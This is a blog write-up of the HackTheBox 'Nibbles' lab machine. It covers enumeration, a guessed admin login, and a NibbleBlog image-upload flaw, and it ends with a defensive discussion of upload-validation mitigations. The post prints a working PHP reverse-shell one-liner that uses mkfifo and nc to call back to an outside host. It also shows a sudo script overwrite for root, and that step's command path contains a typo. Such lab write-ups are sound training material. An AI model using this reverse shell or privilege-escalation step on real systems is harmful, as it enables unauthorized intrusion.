---
layout: post
title: 'HackTheBox - Nibbles'
date: 2018-07-18
author: Casey Mullineaux
cover: '/images/htb/nibbles/nibbles.jpg'
tags: hackthebox
---

Image upload forms on websites are just for pictures of your cats, right?

In this post, I demonstrate how to identify a data validation vulnerability in an image upload plugin, and bypass content filters to execute malicious code and gain access to the remote system.

# Hacking the box

1. [Enumeration](#enum)
2. [Exploitation](#exploit)
3. [Privilege escalation](#privesc)
4. [Deconstructing the hack](#deconstruct)

# <a name="enum"></a> Enumeration

I run a standard `nmap` scan on the host to find ports 22 (SSH) and 80 (HTTP) open
```bash
nmap -sV -sC -oA nibbles 10.10.10.75
```
* **-sV** enumerate version info
* **-sC** run safe scripts
* **-oA** output all formats

![htb-nibbles-01](/images/htb/nibbles/htb-nibbles-01.png)

I browse to the default webpage and am greeted by "Hello world!".

![htb-nibbles-02](/images/htb/nibbles/htb-nibbles-02.png)

Viewing the source reveals additional info.

![htb-nibbles-03](/images/htb/nibbles/htb-nibbles-03.png)

I browse to http://10.10.10.75/nibbleblog and land on a pretty simple front page for a blogging platform.

![htb-nibbles-04](/images/htb/nibbles/htb-nibbles-04.png)

I explore the site a little but find nothing of interest.

Using `gobuster`, I ran a brute force attack against the **/nibbleblog** directory to see if any other pages might be accessible.

```bash
gobuster -u http://10.10.10.75/nibbleblog -w /usr/share/wordlists/dirb/common.txt -t 50
```
* **-u** URL to target
* **-w** Wordlist to use
* **-t** Number of threads

![htb-nibbles-05](/images/htb/nibbles/htb-nibbles-05.png)

`gobuster` reveals **/admin.php** which looks intereting...

![htb-nibbles-06](/images/htb/nibbles/htb-nibbles-06.png)

I try a bunch of default cred combinations (admin:admin, admin:password and so on), but don't get a hit.

When entering default credentials, it surfaces a link to reset a forgotten password.

![htb-nibbles-07](/images/htb/nibbles/htb-nibbles-07.png)

![htb-nibbles-08](/images/htb/nibbles/htb-nibbles-08.png)

I mess around with the password reset functionality for a while, but that turns out to be a dead end.

I then continue to spend a bunch more time trying to brute force the password using `hyrda` and some common password lists, however that returns no positive results.

Now desperate, I start guessing. HackTheBox often uses the name of the challenge as passwords to objects within the challenge itself, so I give that a try. I was able to guess the credentials successfully. 

<p class="note"><strong>Rant:</strong> This is where the immersion of the red-teaming activity is broken. I strongly dislike the fact I was required to know information on the training platform to complete this challenge. In my opinion, a <i>good</i> training exercise replicates the real world as much as possible. It wouldn't have been difficult for the creator to set the credential to a value in one of the common wordlists, or some other hidden way the password could be recovered. This would have kept the full experience in tact, and provided a *method* that can be used to obrain the credentials, rather than having people simply guess.</p> 

After much-wasted effort, I successfully logged in with `admin:nibbles`. 

<p align="center">
    <img src="https://media.giphy.com/media/RcZiNH8v6Kt8c/giphy.gif">
</p>

# <a name="exploit"></a> Exploitation

Once I had successfully authenticated with the blogging platform, I ran `searchsploit` to look for any known vulnerabilities.

```bash
searchsploit nibbleblog
```

The results return a known arbitrary file upload exploit that looks useful. I read through the code of the exploit to get an understanding of how the exploit works. There was also a link to [this article](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html) that explains the mechanics of the exploit even further.

In a nutshell, this exploit takes advantage of the "my image" upload plugin that lets you upload any filetype. The vulnerability is that there is no validation whether the file you selected for upload is an image or not. In this case, the plugin can be used to upload malicious files.

I craft a quick and dirty PHP reverse shell.

```php
<?php echo exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.66 1234 >/tmp/f'); ?>
```

... and open a netcat listener on my  Kali host.

```bash
nc -lvnp 1234
```

Using the `my image` plugin, I upload the PHP script.

![htb-nibbles-09](/images/htb/nibbles/htb-nibbles-09.png)

When a file is uploaded, no information is provided on where the file has been saved. Using the results from my `gobuster` scan earlier, I poke around in the **/content** directory and find my upload located in **/nibbleblog/content/private/plugins/my_image/image.php**.

![htb-nibbles-10](/images/htb/nibbles/htb-nibbles-10.png)

I browse to the **/image.php** file in my browser, and it returns a shell.

![htb-nibbles-11](/images/htb/nibbles/htb-nibbles-11.png)
<p align="center">
    <img src="https://media.giphy.com/media/vtVpHbnPi9TLa/giphy.gif">
</p>

In `nibbler's` home directory, I see the user flag and a zip file.

```bash
nibbler@Nibbles:/home/nibbler$ ls -l
total 8
-r-------- 1 nibbler nibbler 1855 Dec 10 22:07 personal.zip
-r-------- 1 nibbler nibbler   33 Dec 10 22:35 user.txt
nibbler@Nibbles:/home/nibbler$ 
```

<p class="success">User flag obtained!</p>

# <a name="privesc"></a> Privilege escalation
The first thing I do when I get a new shell is to see if the user has access to any elevated files or binaries.

```bash
$ sudo -l
sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
$
```

Here I see that the **nibbler** user is permitted to execute a shell script as the root user, so I go and check that out.

Looking back at `personal.zip` I found in the home directory, I unzip the file and extract the shell script that nibbler is permitted to execute as root.

```bash 
nibbler@Nibbles:/home/nibbler$ unzip -K personal.zip 
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
nibbler@Nibbles:/home/nibbler$ 
```

I replace the contents of `monitor.sh` with code to spawn a new shell, and execute the script as root using `sudo` to get a root shell.

```bash
nibbler@Nibbles:/home/nibbler$ echo '/bin/sh -i' > ./personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ sudo /home/nibbles/personal/stuff/monitor/.sh
```

![htb-nibbles-12](/images/htb/nibbles/htb-nibbles-12.png)

<p class="success">root flag obtained!</p>

<p align="center">
    <img src="https://media.giphy.com/media/11Feog5PTumNnq/giphy.gif">
</p>

# <a name="deconstruct"></a>Deconstructing the hack
Exploitation was possible due to an [unrestrited file upload vulnerability](https://www.owasp.org/index.php/Unrestricted_File_Upload) in a plugin of the blogging platform. As explained in the [published security avisory](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html) for this vulnerability, when uploading files via the "My Image" plugin, which is delivered by default with NibbleBlog, it keeps the original extension of uploaded files. This extension, or the actual file type, are not checked, and therefore it is possible to upload PHP files to gain code execution.

This [Qualys blog post](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability) gives a good rundown on this topic, which I'll paraphrase below.

## Common (but ineffective) mitigations
There are a few common, but ineffective techniques that are often used to attempt to mitigate this vulnerability, and an examination of these can provide insight on how they can be circumvented.

### 1. File extension verification

Blacklisting and whitelisting of file extensions are the most common file upload validation methods implemented by developers.

To implement blacklisting, the developer needs to gather all executable extensions that they want to be disallowed by the server. This protection can be bypassed by using different executable extensions such as php3, php4, php5, shtml, phtml, cgi etc., which are understood and will be executed by the server.

In contrast, whitelisting gives developers more control over security when compared to blacklisting, as the only explicitly allowed extensions are permitted, and all other file extensions refused.  However, this control also has a history of server-side bugs which allow it to be bypassed.

### 2. Content-type verification

This kind of verification entirely depends upon the `content-type` header containing the MIME type. Content-type verification is a very week validation mechanism, as this is a security control placed on the user's browser, which can be manipulated by the user (the attacker).

### 3. Image type content verification

Many developers believe that image type content verification is the safest method to prevent malicious file upload issues. This technique uses additional libraries or functions (such as PHPs [getimagesize()](https://secure.php.net/manual/en/function.getimagesize.php) function) to retrieve information on the uploaded file including file type, size, dimensions etc., which is helpful to detect if an uploaded file is an image. However, this too is not foolproof.

Security researchers have already been able to demonstrate ways to inject executable code in certain sections of images. Some known examples are [JPEG image EXIF header injections](https://hackingandsecurity.blogspot.com/2017/08/malware-hidden-inside-jpg-exif-headers.html) and encoding of executable code in [PNG IDAT chunks](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

### 4. Web application firewalls (WAFs)

Web application firewalls also provide another layer of protection against these types of attacks. WAFs intercept and inspect all HTTP requests using a set of customised policies to weed out bogus traffic. Traditionally, the customisation of WAF security rules is complex and can be difficult to achieve without expert knowledge. Customized WAFs also require maintenance as each application is modified.

## The answer

The answer, as always, is [defence in depth](https://www.owasp.org/index.php/Defense_in_depth). A combination of these techniques is the best mitigating strategy. Even though each has their downsides and none are infallible, with each layer of defence you add, you increase the complexity and therefore time and effort required to compromise your system.

Nothing is perfect. There will always be techniques consistently discovered to bypass security controls. It's merely the nature of the game and one that must be accepted. While it may never be possible to make your systems impenetrable, your goal should be making it so complicated that it's not worth the effort.

For someone to penetrate through multiple layers of well-implimented security protocols and defence mechanisms, although is theoretically possible, will require an incredibly skilled and determined hacker to develop highly customised and currently unknown (0day) exploits targeted explicitly at your unique environment. This is incredibly expensive in both time and resources, and the chances of that happening are basically zero. 

Practising defence in depth is often enough to prevent all the script kiddies from exploiting any low hanging fruit, and discourage any skilful bad actors. 

Unless your systems contain hypersensitive information (like nuclear launch codes)  or you're the direct target of organised cybercrime with the budget of a small country, then you should have nothing to worry about if you correctly implement known good security practices in multiple layers.